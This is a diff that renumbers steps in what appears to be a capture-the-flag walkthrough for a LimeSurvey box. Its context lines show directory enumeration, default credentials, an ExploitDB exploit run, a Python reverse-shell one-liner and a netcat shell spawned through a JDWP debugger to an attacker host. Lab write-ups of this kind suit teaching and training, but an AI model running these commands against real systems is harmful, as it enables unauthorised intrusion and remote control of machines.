@@ -48,11 +48,11 @@ gobuster dir -u http://<TARGET_IP>:80 -w /usr/share/wordlists/dirbuster/director
 /server-status        (Status: 403) [Size: 278]
 ```
 
-2. Navigate to `http://<TARGET_IP>/admin` which redirects to `http://<TARGET_IP>/index.php/admin/authentication/sa/login`. This reveals a LimeSurvey installation.
+3. Navigate to `http://<TARGET_IP>/admin` which redirects to `http://<TARGET_IP>/index.php/admin/authentication/sa/login`. This reveals a LimeSurvey installation.
 
    - Default credentials: `admin:password`
 
-3. Download the exploit from [ExploitDB](https://www.exploit-db.com/exploits/46634):
+4. Download the exploit from [ExploitDB](https://www.exploit-db.com/exploits/46634):
 
 ```bash
 python 46634.py http://<TARGET_IP> admin password
@@ -96,7 +96,7 @@ nc -lvnp 4444
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-2. Check for internal services:
+3. Check for internal services:
 
 ```bash
 netstat -ntpl
@@ -122,13 +122,13 @@ tcp6       0      0 ::1:631                 :::*                    LISTEN      
 
 Port 18001 is interesting - it's a Java Debug Wire Protocol (JDWP) port running locally.
 
-3. Set up another listener for the second reverse shell:
+4. Set up another listener for the second reverse shell:
 
 ```bash
 nc -lvnp 5555
 ```
 
-4. Connect to the Java debugging port using `jdb`:
+5. Connect to the Java debugging port using `jdb`:
 
 ```bash
 jdb -attach localhost:18001
@@ -142,27 +142,27 @@ Set deferred uncaught java.lang.Throwable
 Initializing jdb ...
 ```
 
-5. Set a breakpoint in a commonly executed method:
+6. Set a breakpoint in a commonly executed method:
 
 ```bash
 > stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
 Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
 ```
 
-6. Wait for the breakpoint to trigger:
+7. Wait for the breakpoint to trigger:
 
 ```
 Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0
 ```
 
-7. Execute a command to spawn a reverse shell as the user running the Java process:
+8. Execute a command to spawn a reverse shell as the user running the Java process:
 
 ```bash
 Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc <ATTACKER_IP> 5555 -e /bin/sh")
  new java.lang.Runtime().exec("nc <ATTACKER_IP> 5555 -e /bin/sh") = "Process[pid=27056, exitValue="not exited"]"
 ```
 
-5. On your second reverse shell (port 5555), you should now be connected as user `veronica`:
+9. On your second reverse shell (port 5555), you should now be connected as user `veronica`:
 
 ```bash
 whoami
